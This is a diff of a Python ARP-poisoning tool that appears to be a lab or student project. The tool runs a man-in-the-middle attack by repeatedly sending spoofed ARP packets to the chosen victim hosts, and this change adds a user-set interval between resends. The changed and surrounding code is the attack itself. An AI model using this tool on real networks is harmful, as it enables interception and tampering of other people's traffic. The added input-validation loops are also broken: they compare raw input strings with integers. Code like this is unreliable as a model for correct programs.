@@ -33,12 +33,22 @@ def arp_poison():
     # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
     nrOfHosts = int(input("The number of hosts you want to ARP poison: "))
 
-    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2
+    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2.
     if (nrOfHosts < 2):
         print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
         print("The number of hosts you want to ARP poison: ")
         while (nrOfHosts < 2):
             nrOfHosts = input()
+
+    # The user is given the option to choose how often the ARP entries need to be updated
+    updateTimer = int(input("The the time (in seconds) it takes for the ARP entries to be updated (advice: Do not set it too high, e.g. > 60 seconds).\nSet update timer to: "))
+
+    # If update timer is set to less than 1 seconds, a while loop is instantiated which can only be left if the update timer is set to greater or equal than 1.
+    if (updateTimer < 1):
+        print("A MITM ARP poisoning attack with an update timer < 1 seconds is not possible.")
+        print("The the time (in seconds) it takes for the ARP entries to be updated (advice: Do not set it too high, e.g. > 60 seconds).\nSet update timer to: ")
+        while (updateTimer < 1):
+            updateTimer = input()
 
     macVictimList = []
     ipVictimList = []
@@ -100,7 +110,8 @@ def arp_poison():
                 arp[ARP].pdst = ipVictimList[i]
                 sendp(arp, iface="enp0s9")
         # Timer
-        time.sleep(3)
+        # Default we used while testing was: updateTimer = 3
+        time.sleep(updateTimer)
 
 
 # To Do: before you are able to run this method succesfully
